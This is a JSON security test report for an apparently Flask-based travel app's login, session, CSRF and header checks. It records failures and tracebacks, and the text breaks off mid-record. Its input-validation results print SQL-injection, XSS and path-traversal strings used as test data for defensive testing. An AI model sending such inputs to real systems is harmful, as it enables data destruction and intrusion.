{
  "timestamp": "2025-07-26T01:29:18.143697",
  "total_duration": 36.48469591140747,
  "summary": {
    "total_modules": 9,
    "available_modules": 7,
    "total_tests": 119,
    "total_failures": 29,
    "total_errors": 6,
    "total_skipped": 0,
    "overall_success_rate": 70.58823529411765
  },
  "results": [
    {
      "module": "test_auth_endpoints",
      "description": "Authentication Endpoints",
      "tests_run": 16,
      "failures": 0,
      "errors": 0,
      "skipped": 0,
      "success_rate": 100.0,
      "duration": 0.68039870262146,
      "failure_details": [],
      "error_details": [],
      "output": "test_auth_status_authenticated (test_auth_endpoints.TestAuthEndpoints.test_auth_status_authenticated)\nTest auth status when authenticated. ... ok\ntest_auth_status_not_authenticated (test_auth_endpoints.TestAuthEndpoints.test_auth_status_not_authenticated)\nTest auth status when not authenticated. ... ok\ntest_csrf_token_validation (test_auth_endpoints.TestAuthEndpoints.test_csrf_token_validation)\nTest CSRF token generation and validation. ... ok\ntest_form_data_login (test_auth_endpoints.TestAuthEndpoints.test_form_data_login)\nTest login with form data instead of JSON. ... ok\ntest_login_invalid_password (test_auth_endpoints.TestAuthEndpoints.test_login_invalid_password)\nTest login with invalid password. ... ok\ntest_login_missing_password (test_auth_endpoints.TestAuthEndpoints.test_login_missing_password)\nTest login with missing password. ... ok\ntest_login_page_get (test_auth_endpoints.TestAuthEndpoints.test_login_page_get)\nTest GET request to login page. ... ok\ntest_login_rate_limiting (test_auth_endpoints.TestAuthEndpoints.test_login_rate_limiting)\nTest rate limiting for failed login attempts. ... ok\ntest_login_remember_me (test_auth_endpoints.TestAuthEndpoints.test_login_remember_me)\nTest login with remember me option. ... ok\ntest_login_success (test_auth_endpoints.TestAuthEndpoints.test_login_success)\nTest successful login. ... ok\ntest_logout_invalid_csrf (test_auth_endpoints.TestAuthEndpoints.test_logout_invalid_csrf)\nTest logout with invalid CSRF token. ... ok\ntest_logout_success (test_auth_endpoints.TestAuthEndpoints.test_logout_success)\nTest successful logout. ... ok\ntest_logout_without_login (test_auth_endpoints.TestAuthEndpoints.test_logout_without_login)\nTest logout without being logged in. ... ok\ntest_protected_route_access (test_auth_endpoints.TestAuthEndpoints.test_protected_route_access)\nTest access to protected routes. ... ok\ntest_security_headers (test_auth_endpoints.TestAuthEndpoints.test_security_headers)\nTest that security headers are properly set. ... ok\ntest_session_persistence (test_auth_endpoints.TestAuthEndpoints.test_session_persistence)\nTest that session persists across requests. ... ok\n\n----------------------------------------------------------------------\nRan 16 tests in 0.680s\n\nOK\n",
      "status": "success"
    },
    {
      "module": "test_auth_middleware",
      "description": "Authentication Middleware",
      "tests_run": 26,
      "failures": 0,
      "errors": 0,
      "skipped": 0,
      "success_rate": 100.0,
      "duration": 0.05516338348388672,
      "failure_details": [],
      "error_details": [],
      "output": "test_cleanup_expired_attempts (test_auth_middleware.TestAuthMiddleware.test_cleanup_expired_attempts)\nTest cleanup of expired failed attempts. ... ok\ntest_csrf_token_generation (test_auth_middleware.TestAuthMiddleware.test_csrf_token_generation)\nTest CSRF token generation and retrieval. ... ok\ntest_csrf_token_validation (test_auth_middleware.TestAuthMiddleware.test_csrf_token_validation)\nTest CSRF token validation. ... ok\ntest_csrf_token_validation_not_authenticated (test_auth_middleware.TestAuthMiddleware.test_csrf_token_validation_not_authenticated)\nTest CSRF token validation when not authenticated. ... ok\ntest_is_authenticated (test_auth_middleware.TestAuthMiddleware.test_is_authenticated)\nTest authentication status check. ... ok\ntest_password_validation_empty (test_auth_middleware.TestAuthMiddleware.test_password_validation_empty)\nTest password validation with empty password. ... ok\ntest_password_validation_failure (test_auth_middleware.TestAuthMiddleware.test_password_validation_failure)\nTest failed password validation. ... ok\ntest_password_validation_success (test_auth_middleware.TestAuthMiddleware.test_password_validation_success)\nTest successful password validation. ... ok\ntest_progressive_delay_calculation (test_auth_middleware.TestAuthMiddleware.test_progressive_delay_calculation)\nTest progressive delay calculation based on attempt count. ... ok\ntest_progressive_delay_enforcement (test_auth_middleware.TestAuthMiddleware.test_progressive_delay_enforcement)\nTest that progressive delays are enforced. ... ok\ntest_rate_limiting_allowed (test_auth_middleware.TestAuthMiddleware.test_rate_limiting_allowed)\nTest rate limiting when attempts are within limit. ... ok\ntest_rate_limiting_clear_attempts (test_auth_middleware.TestAuthMiddleware.test_rate_limiting_clear_attempts)\nTest clearing failed attempts after successful login. ... ok\ntest_rate_limiting_lockout (test_auth_middleware.TestAuthMiddleware.test_rate_limiting_lockout)\nTest IP lockout after max attempts. ... ok\ntest_rate_limiting_record_attempts (test_auth_middleware.TestAuthMiddleware.test_rate_limiting_record_attempts)\nTest recording failed attempts. ... ok\ntest_require_auth_decorator (test_auth_middleware.TestAuthMiddleware.test_require_auth_decorator)\nTest the require_auth decorator. ... ok\ntest_security_stats (test_auth_middleware.TestAuthMiddleware.test_security_stats)\nTest security statistics collection. ... ok\ntest_session_creation_success (test_auth_middleware.TestAuthMiddleware.test_session_creation_success)\nTest successful session creation. ... ok\ntest_session_creation_with_remember_me (test_auth_middleware.TestAuthMiddleware.test_session_creation_with_remember_me)\nTest session creation with remember me option. ... ok\ntest_session_destroy (test_auth_middleware.TestAuthMiddleware.test_session_destroy)\nTest session destruction. ... ok\ntest_session_info (test_auth_middleware.TestAuthMiddleware.test_session_info)\nTest getting session information. ... ok\ntest_session_validation_expired (test_auth_middleware.TestAuthMiddleware.test_session_validation_expired)\nTest session validation with expired session. ... ok\ntest_session_validation_missing_fields (test_auth_middleware.TestAuthMiddleware.test_session_validation_missing_fields)\nTest session validation with missing required fields. ... ok\ntest_session_validation_not_authenticated (test_auth_middleware.TestAuthMiddleware.test_session_validation_not_authenticated)\nTest session validation when not authenticated. ... ok\ntest_session_validation_remember_me_not_expired (test_auth_middleware.TestAuthMiddleware.test_session_validation_remember_me_not_expired)\nTest session validation with remember me and not expired. ... ok\ntest_session_validation_success (test_auth_middleware.TestAuthMiddleware.test_session_validation_success)\nTest successful session validation. ... ok\ntest_user_agent_tracking (test_auth_middleware.TestAuthMiddleware.test_user_agent_tracking)\nTest user agent tracking for security monitoring. ... ok\n\n----------------------------------------------------------------------\nRan 26 tests in 0.055s\n\nOK\n",
      "status": "success"
    },
    {
      "module": "test_security_headers",
      "description": "Security Headers",
      "tests_run": 17,
      "failures": 4,
      "errors": 2,
      "skipped": 0,
      "success_rate": 64.70588235294117,
      "duration": 0.009075164794921875,
      "failure_details": [
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_headers.py\", line 183, in test_lockout_duration_configuration\n    self.assertGreaterEqual(lockout_duration, 300, \"LOCKOUT_DURATION should be at least 5 minutes\")\nAssertionError: 60 not greater than or equal to 300 : LOCKOUT_DURATION should be at least 5 minutes\n",
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_headers.py\", line 199, in test_remember_timeout_configuration\n    self.assertGreaterEqual(remember_timeout, 86400, \"REMEMBER_TIMEOUT should be at least 1 day\")\nAssertionError: 600 not greater than or equal to 86400 : REMEMBER_TIMEOUT should be at least 1 day\n",
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_headers.py\", line 191, in test_session_timeout_configuration\n    self.assertGreaterEqual(session_timeout, 1800, \"SESSION_TIMEOUT should be at least 30 minutes\")\nAssertionError: 300 not greater than or equal to 1800 : SESSION_TIMEOUT should be at least 30 minutes\n",
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_headers.py\", line 116, in test_content_security_policy_header\n    self.assertNotIn(\"'unsafe-inline'\", csp, \"CSP should not allow unsafe-inline scripts\")\nAssertionError: \"'unsafe-inline'\" unexpectedly found in \"default-src 'self'; script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net; img-src 'self' data: blob:; font-src 'self' https://cdnjs.cloudflare.com; connect-src 'self'; media-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self';\" : CSP should not allow unsafe-inline scripts\n"
      ],
      "error_details": [
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_headers.py\", line 243, in test_secret_key_configuration\n    secret_key = auth_config.SESSION_SECRET_KEY\n                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nAttributeError: 'AuthConfig' object has no attribute 'SESSION_SECRET_KEY'\n",
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_headers.py\", line 224, in test_session_security_configuration\n    if not auth_config.DEBUG:\n           ^^^^^^^^^^^^^^^^^\nAttributeError: 'AuthConfig' object has no attribute 'DEBUG'\n"
      ],
      "output": "test_bcrypt_rounds_configuration (test_security_headers.TestRateLimitingConfiguration.test_bcrypt_rounds_configuration)\nTest BCRYPT_ROUNDS configuration. ... ok\ntest_lockout_duration_configuration (test_security_headers.TestRateLimitingConfiguration.test_lockout_duration_configuration)\nTest LOCKOUT_DURATION configuration. ... FAIL\ntest_max_login_attempts_configuration (test_security_headers.TestRateLimitingConfiguration.test_max_login_attempts_configuration)\nTest MAX_LOGIN_ATTEMPTS configuration. ... ok\ntest_remember_timeout_configuration (test_security_headers.TestRateLimitingConfiguration.test_remember_timeout_configuration)\nTest REMEMBER_TIMEOUT configuration. ... FAIL\ntest_session_timeout_configuration (test_security_headers.TestRateLimitingConfiguration.test_session_timeout_configuration)\nTest SESSION_TIMEOUT configuration. ... FAIL\ntest_password_hash_configuration (test_security_headers.TestSecurityConfiguration.test_password_hash_configuration)\nTest password hash configuration. ... ok\ntest_secret_key_configuration (test_security_headers.TestSecurityConfiguration.test_secret_key_configuration)\nTest secret key configuration. ... ERROR\ntest_session_security_configuration (test_security_headers.TestSecurityConfiguration.test_session_security_configuration)\nTest session security configuration. ... ERROR\ntest_cache_control_for_sensitive_endpoints (test_security_headers.TestSecurityHeaders.test_cache_control_for_sensitive_endpoints)\nTest cache control headers for sensitive endpoints. ... ok\ntest_content_security_policy_header (test_security_headers.TestSecurityHeaders.test_content_security_policy_header)\nTest Content-Security-Policy header if present. ... FAIL\ntest_referrer_policy_header (test_security_headers.TestSecurityHeaders.test_referrer_policy_header)\nTest Referrer-Policy header if present. ... ok\ntest_security_headers_configuration (test_security_headers.TestSecurityHeaders.test_security_headers_configuration)\nTest that all required security headers are configured. ... ok\ntest_security_headers_in_responses (test_security_headers.TestSecurityHeaders.test_security_headers_in_responses)\nTest that security headers are present in HTTP responses. ... ok\ntest_strict_transport_security_header (test_security_headers.TestSecurityHeaders.test_strict_transport_security_header)\nTest Strict-Transport-Security header. ... ok\ntest_x_content_type_options_header (test_security_headers.TestSecurityHeaders.test_x_content_type_options_header)\nTest X-Content-Type-Options header. ... ok\ntest_x_frame_options_header (test_security_headers.TestSecurityHeaders.test_x_frame_options_header)\nTest X-Frame-Options header. ... ok\ntest_x_xss_protection_header (test_security_headers.TestSecurityHeaders.test_x_xss_protection_header)\nTest X-XSS-Protection header. ... ok\n\n======================================================================\nERROR: test_secret_key_configuration (test_security_headers.TestSecurityConfiguration.test_secret_key_configuration)\nTest secret key configuration.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_headers.py\", line 243, in test_secret_key_configuration\n    secret_key = auth_config.SESSION_SECRET_KEY\n                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nAttributeError: 'AuthConfig' object has no attribute 'SESSION_SECRET_KEY'\n\n======================================================================\nERROR: test_session_security_configuration (test_security_headers.TestSecurityConfiguration.test_session_security_configuration)\nTest session security configuration.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_headers.py\", line 224, in test_session_security_configuration\n    if not auth_config.DEBUG:\n           ^^^^^^^^^^^^^^^^^\nAttributeError: 'AuthConfig' object has no attribute 'DEBUG'\n\n======================================================================\nFAIL: test_lockout_duration_configuration (test_security_headers.TestRateLimitingConfiguration.test_lockout_duration_configuration)\nTest LOCKOUT_DURATION configuration.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_headers.py\", line 183, in test_lockout_duration_configuration\n    self.assertGreaterEqual(lockout_duration, 300, \"LOCKOUT_DURATION should be at least 5 minutes\")\nAssertionError: 60 not greater than or equal to 300 : LOCKOUT_DURATION should be at least 5 minutes\n\n======================================================================\nFAIL: test_remember_timeout_configuration (test_security_headers.TestRateLimitingConfiguration.test_remember_timeout_configuration)\nTest REMEMBER_TIMEOUT configuration.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_headers.py\", line 199, in test_remember_timeout_configuration\n    self.assertGreaterEqual(remember_timeout, 86400, \"REMEMBER_TIMEOUT should be at least 1 day\")\nAssertionError: 600 not greater than or equal to 86400 : REMEMBER_TIMEOUT should be at least 1 day\n\n======================================================================\nFAIL: test_session_timeout_configuration (test_security_headers.TestRateLimitingConfiguration.test_session_timeout_configuration)\nTest SESSION_TIMEOUT configuration.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_headers.py\", line 191, in test_session_timeout_configuration\n    self.assertGreaterEqual(session_timeout, 1800, \"SESSION_TIMEOUT should be at least 30 minutes\")\nAssertionError: 300 not greater than or equal to 1800 : SESSION_TIMEOUT should be at least 30 minutes\n\n======================================================================\nFAIL: test_content_security_policy_header (test_security_headers.TestSecurityHeaders.test_content_security_policy_header)\nTest Content-Security-Policy header if present.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_headers.py\", line 116, in test_content_security_policy_header\n    self.assertNotIn(\"'unsafe-inline'\", csp, \"CSP should not allow unsafe-inline scripts\")\nAssertionError: \"'unsafe-inline'\" unexpectedly found in \"default-src 'self'; script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net; img-src 'self' data: blob:; font-src 'self' https://cdnjs.cloudflare.com; connect-src 'self'; media-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self';\" : CSP should not allow unsafe-inline scripts\n\n----------------------------------------------------------------------\nRan 17 tests in 0.009s\n\nFAILED (failures=4, errors=2)\n",
      "status": "warning"
    },
    {
      "module": "test_session_timeout",
      "description": "Session Timeout",
      "tests_run": 6,
      "failures": 0,
      "errors": 0,
      "skipped": 0,
      "success_rate": 100.0,
      "duration": 24.02484941482544,
      "failure_details": [],
      "error_details": [],
      "output": "test_session_activity_update (test_session_timeout.TestSessionTimeout.test_session_activity_update)\nTest that session activity is updated on validation. ... ok\ntest_session_cleanup (test_session_timeout.TestSessionTimeout.test_session_cleanup)\nTest session cleanup functionality. ... ok\ntest_session_info_expiration_time (test_session_timeout.TestSessionTimeout.test_session_info_expiration_time)\nTest that session info includes correct expiration time. ... ok\ntest_session_info_remember_me_expiration (test_session_timeout.TestSessionTimeout.test_session_info_remember_me_expiration)\nTest that session info includes correct expiration time for remember me. ... ok\ntest_session_timeout_normal (test_session_timeout.TestSessionTimeout.test_session_timeout_normal)\nTest normal session timeout (without remember me). ... ok\ntest_session_timeout_remember_me (test_session_timeout.TestSessionTimeout.test_session_timeout_remember_me)\nTest extended session timeout with remember me. ... ok\n\n----------------------------------------------------------------------\nRan 6 tests in 24.025s\n\nOK\n",
      "status": "success"
    },
    {
      "module": "test_password_change",
      "description": "Password Change",
      "tests_run": 15,
      "failures": 1,
      "errors": 1,
      "skipped": 0,
      "success_rate": 86.66666666666667,
      "duration": 6.098348379135132,
      "failure_details": [
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_password_change.py\", line 269, in test_validate_weak_passwords\n    self.assertFalse(result['valid'])\nAssertionError: True is not false\n"
      ],
      "error_details": [
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_password_change.py\", line 351, in test_terminate_all_sessions\n    self.app.test_request_context():\n    ^^^^^^^^\nAttributeError: 'TestSessionTermination' object has no attribute 'app'\n"
      ],
      "output": "test_change_password_invalid_csrf (test_password_change.TestPasswordChange.test_change_password_invalid_csrf)\nTest password change with invalid CSRF token. ... ok\ntest_change_password_mismatch (test_password_change.TestPasswordChange.test_change_password_mismatch)\nTest password change with mismatched new passwords. ... ok\ntest_change_password_missing_fields (test_password_change.TestPasswordChange.test_change_password_missing_fields)\nTest password change with missing required fields. ... ok\ntest_change_password_same_as_current (test_password_change.TestPasswordChange.test_change_password_same_as_current)\nTest password change with same password as current. ... ok\ntest_change_password_success (test_password_change.TestPasswordChange.test_change_password_success)\nTest successful password change. ... ok\ntest_change_password_terminates_sessions (test_password_change.TestPasswordChange.test_change_password_terminates_sessions)\nTest that password change terminates all active sessions. ... ok\ntest_change_password_unauthenticated (test_password_change.TestPasswordChange.test_change_password_unauthenticated)\nTest password change without authentication. ... ok\ntest_change_password_update_failure (test_password_change.TestPasswordChange.test_change_password_update_failure)\nTest password change when password hash update fails. ... ok\ntest_change_password_weak_password (test_password_change.TestPasswordChange.test_change_password_weak_password)\nTest password change with weak password. ... ok\ntest_change_password_wrong_current_password (test_password_change.TestPasswordChange.test_change_password_wrong_current_password)\nTest password change with incorrect current password. ... ok\ntest_update_password_hash_success (test_password_change.TestPasswordHashUpdate.test_update_password_hash_success)\nTest successful password hash update. ... ok\ntest_update_password_hash_with_existing_config (test_password_change.TestPasswordHashUpdate.test_update_password_hash_with_existing_config)\nTest password hash update with existing config file. ... ok\ntest_validate_strong_password (test_password_change.TestPasswordStrengthValidation.test_validate_strong_password)\nTest validation of strong passwords. ... ok\ntest_validate_weak_passwords (test_password_change.TestPasswordStrengthValidation.test_validate_weak_passwords)\nTest validation of weak passwords. ... \n  test_validate_weak_passwords (test_password_change.TestPasswordStrengthValidation.test_validate_weak_passwords) (password='Password123!')\nTest validation of weak passwords. ... FAIL\ntest_terminate_all_sessions (test_password_change.TestSessionTermination.test_terminate_all_sessions)\nTest termination of all active sessions. ... ERROR\n\n======================================================================\nERROR: test_terminate_all_sessions (test_password_change.TestSessionTermination.test_terminate_all_sessions)\nTest termination of all active sessions.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_password_change.py\", line 351, in test_terminate_all_sessions\n    self.app.test_request_context():\n    ^^^^^^^^\nAttributeError: 'TestSessionTermination' object has no attribute 'app'\n\n======================================================================\nFAIL: test_validate_weak_passwords (test_password_change.TestPasswordStrengthValidation.test_validate_weak_passwords) (password='Password123!')\nTest validation of weak passwords.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_password_change.py\", line 269, in test_validate_weak_passwords\n    self.assertFalse(result['valid'])\nAssertionError: True is not false\n\n----------------------------------------------------------------------\nRan 15 tests in 6.098s\n\nFAILED (failures=1, errors=1)\n",
      "status": "success"
    },
    {
      "module": "test_comprehensive_security",
      "description": "Comprehensive Security",
      "tests_run": 16,
      "failures": 9,
      "errors": 1,
      "skipped": 0,
      "success_rate": 37.5,
      "duration": 1.4654724597930908,
      "failure_details": [
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_comprehensive_security.py\", line 169, in test_brute_force_protection\n    self.assertEqual(response.status_code, 401)\nAssertionError: 429 != 401\n\nStdout:\nSECURITY: Failed login attempt #1 from IP 127.0.0.1\nSECURITY: Failed login attempt #2 from IP 127.0.0.1\n",
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_comprehensive_security.py\", line 277, in test_input_validation\n    self.assertIn(response.status_code, [400, 401])\nAssertionError: 403 not found in [400, 401]\n",
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_comprehensive_security.py\", line 277, in test_input_validation\n    self.assertIn(response.status_code, [400, 401])\nAssertionError: 403 not found in [400, 401]\n",
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_comprehensive_security.py\", line 277, in test_input_validation\n    self.assertIn(response.status_code, [400, 401])\nAssertionError: 403 not found in [400, 401]\n",
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_comprehensive_security.py\", line 277, in test_input_validation\n    self.assertIn(response.status_code, [400, 401])\nAssertionError: 403 not found in [400, 401]\n",
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_comprehensive_security.py\", line 277, in test_input_validation\n    self.assertIn(response.status_code, [400, 401])\nAssertionError: 403 not found in [400, 401]\n",
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_comprehensive_security.py\", line 224, in test_remember_me_functionality\n    self.assertEqual(response.status_code, 200)\nAssertionError: 403 != 200\n",
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_comprehensive_security.py\", line 139, in test_session_persistence_across_requests\n    self.assertEqual(response.status_code, 200)\nAssertionError: 403 != 200\n",
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_comprehensive_security.py\", line 433, in test_authentication_configuration\n    self.assertGreaterEqual(auth_config.LOCKOUT_DURATION, 300)  # 5 minutes\n    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nAssertionError: 60 not greater than or equal to 300\n"
      ],
      "error_details": [
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_comprehensive_security.py\", line 454, in test_secret_key_configuration\n    secret_key = auth_config.SESSION_SECRET_KEY\n                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nAttributeError: 'AuthConfig' object has no attribute 'SESSION_SECRET_KEY'\n"
      ],
      "output": "test_brute_force_protection (test_comprehensive_security.TestComprehensiveAuthentication.test_brute_force_protection)\nTest brute force protection mechanism. ... FAIL\ntest_complete_authentication_workflow (test_comprehensive_security.TestComprehensiveAuthentication.test_complete_authentication_workflow)\nTest complete authentication workflow via API. ... ok\ntest_concurrent_sessions (test_comprehensive_security.TestComprehensiveAuthentication.test_concurrent_sessions)\nTest handling of concurrent sessions. ... ok\ntest_csrf_protection (test_comprehensive_security.TestComprehensiveAuthentication.test_csrf_protection)\nTest CSRF protection throughout the authentication workflow. ... ok\ntest_error_handling_and_recovery (test_comprehensive_security.TestComprehensiveAuthentication.test_error_handling_and_recovery)\nTest error handling and recovery scenarios. ... ok\ntest_input_validation (test_comprehensive_security.TestComprehensiveAuthentication.test_input_validation)\nTest input validation for malicious inputs. ... \n  test_input_validation (test_comprehensive_security.TestComprehensiveAuthentication.test_input_validation) (input='\"; DROP TABLE users; --')\nTest input validation for malicious inputs. ... FAIL\n  test_input_validation (test_comprehensive_security.TestComprehensiveAuthentication.test_input_validation) (input='<script>alert(\"xss\")</script>')\nTest input validation for malicious inputs. ... FAIL\n  test_input_validation (test_comprehensive_security.TestComprehensiveAuthentication.test_input_validation) (input='../../../etc/passwd')\nTest input validation for malicious inputs. ... FAIL\n  test_input_validation (test_comprehensive_security.TestComprehensiveAuthentication.test_input_validation) (input='\\x00\\x01\\x02')\nTest input validation for malicious inputs. ... FAIL\n  test_input_validation (test_comprehensive_security.TestComprehensiveAuthentication.test_input_validation) (inputnTest input validation for malicious inputs. ... FAIL\ntest_remember_me_functionality (test_comprehensive_security.TestComprehensiveAuthentication.test_remember_me_functionality)\nTest remember me functionality. ... FAIL\ntest_security_headers_presence (test_comprehensive_security.TestComprehensiveAuthentication.test_security_headers_presence)\nTest that security headers are present in all responses. ... ok\ntest_session_persistence_across_requests (test_comprehensive_security.TestComprehensiveAuthentication.test_session_persistence_across_requests)\nTest that session persists across multiple requests. ... FAIL\ntest_password_change_workflow (test_comprehensive_security.TestPasswordSecurity.test_password_change_workflow)\nTest complete password change workflow. ... ok\ntest_password_hash_strength (test_comprehensive_security.TestPasswordSecurity.test_password_hash_strength)\nTest that password hashes are properly generated. ... ok\ntest_login_performance (test_comprehensive_security.TestPerformance.test_login_performance)\nTest login performance under normal conditions. ... ok\ntest_multiple_rapid_requests (test_comprehensive_security.TestPerformance.test_multiple_rapid_requests)\nTest handling of multiple rapid authentication requests. ... ok\ntest_authentication_configuration (test_comprehensive_security.TestSecurityConfiguration.test_authentication_configuration)\nTest authentication configuration values. ... FAIL\ntest_password_hash_configuration (test_comprehensive_security.TestSecurityConfiguration.test_password_hash_configuration)\nTest password hash configuration. ... ok\ntest_secret_key_configuration (test_comprehensive_security.TestSecurityConfiguration.test_secret_key_configuration)\nTest secret key configuration. ... ERROR\n\n======================================================================\nERROR: test_secret_key_configuration (test_comprehensive_security.TestSecurityConfiguration.test_secret_key_configuration)\nTest secret key configuration.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_comprehensive_security.py\", line 454, in test_secret_key_configuration\n    secret_key = auth_config.SESSION_SECRET_KEY\n                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nAttributeError: 'AuthConfig' object has no attribute 'SESSION_SECRET_KEY'\n\n======================================================================\nFAIL: test_brute_force_protection (test_comprehensive_security.TestComprehensiveAuthentication.test_brute_force_protection)\nTest brute force protection mechanism.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_comprehensive_security.py\", line 169, in test_brute_force_protection\n    self.assertEqual(response.status_code, 401)\nAssertionError: 429 != 401\n\nStdout:\nSECURITY: Failed login attempt #1 from IP 127.0.0.1\nSECURITY: Failed login attempt #2 from IP 127.0.0.1\n\n======================================================================\nFAIL: test_input_validation (test_comprehensive_security.TestComprehensiveAuthentication.test_input_validation) (input='\"; DROP TABLE users; --')\nTest input validation for malicious inputs.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_comprehensive_security.py\", line 277, in test_input_validation\n    self.assertIn(response.status_code, [400, 401])\nAssertionError: 403 not found in [400, 401]\n\n======================================================================\nFAIL: test_input_validation (test_comprehensive_security.TestComprehensiveAuthentication.test_input_validation) (input='<script>alert(\"xss\")</script>')\nTest input validation for malicious inputs.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_comprehensive_security.py\", line 277, in test_input_validation\n    self.assertIn(response.status_code, [400, 401])\nAssertionError: 403 not found in [400, 401]\n\n======================================================================\nFAIL: test_input_validation (test_comprehensive_security.TestComprehensiveAuthentication.test_input_validation) (input='../../../etc/passwd')\nTest input validation for malicious inputs.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_comprehensive_security.py\", line 277, in test_input_validation\n    self.assertIn(response.status_code, [400, 401])\nAssertionError: 403 not found in [400, 401]\n\n======================================================================\nFAIL: test_input_validation (test_comprehensive_security.TestComprehensiveAuthentication.test_input_validation) (input='\\x00\\x01\\x02')\nTest input validation for malicious inputs.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_comprehensive_security.py\", line 277, in test_input_validation\n    self.assertIn(response.status_code, [400, 401])\nAssertionError: 403 not found in [400, 401]\n\n======================================================================\nFAIL: test_input_validation (test_comprehensive_security.TestComprehensiveAuthentication.test_input_validation) (inputnTest input validation for malicious inputs.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_comprehensive_security.py\", line 277, in test_input_validation\n    self.assertIn(response.status_code, [400, 401])\nAssertionError: 403 not found in [400, 401]\n\n======================================================================\nFAIL: test_remember_me_functionality (test_comprehensive_security.TestComprehensiveAuthentication.test_remember_me_functionality)\nTest remember me functionality.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_comprehensive_security.py\", line 224, in test_remember_me_functionality\n    self.assertEqual(response.status_code, 200)\nAssertionError: 403 != 200\n\n======================================================================\nFAIL: test_session_persistence_across_requests (test_comprehensive_security.TestComprehensiveAuthentication.test_session_persistence_across_requests)\nTest that session persists across multiple requests.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_comprehensive_security.py\", line 139, in test_session_persistence_across_requests\n    self.assertEqual(response.status_code, 200)\nAssertionError: 403 != 200\n\n======================================================================\nFAIL: test_authentication_configuration (test_comprehensive_security.TestSecurityConfiguration.test_authentication_configuration)\nTest authentication configuration values.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_comprehensive_security.py\", line 433, in test_authentication_configuration\n    self.assertGreaterEqual(auth_config.LOCKOUT_DURATION, 300)  # 5 minutes\n    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nAssertionError: 60 not greater than or equal to 300\n\n----------------------------------------------------------------------\nRan 16 tests in 1.465s\n\nFAILED (failures=9, errors=1)\n",
      "status": "critical"
    },
    {
      "module": "test_security_validation",
      "description": "Security Validation",
      "tests_run": 23,
      "failures": 15,
      "errors": 0,
      "skipped": 0,
      "success_rate": 34.78260869565217,
      "duration": 4.15138840675354,
      "failure_details": [
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 516, in test_lockout_duration_enforcement\n    self.assertIn('locked', data['error'].lower())\nAssertionError: 'locked' not found in 'please wait 1 seconds before trying again.'\n\nStdout:\nSECURITY: Failed login attempt #1 from IP 127.0.0.1\nSECURITY: Failed login attempt #2 from IP 127.0.0.1\n",
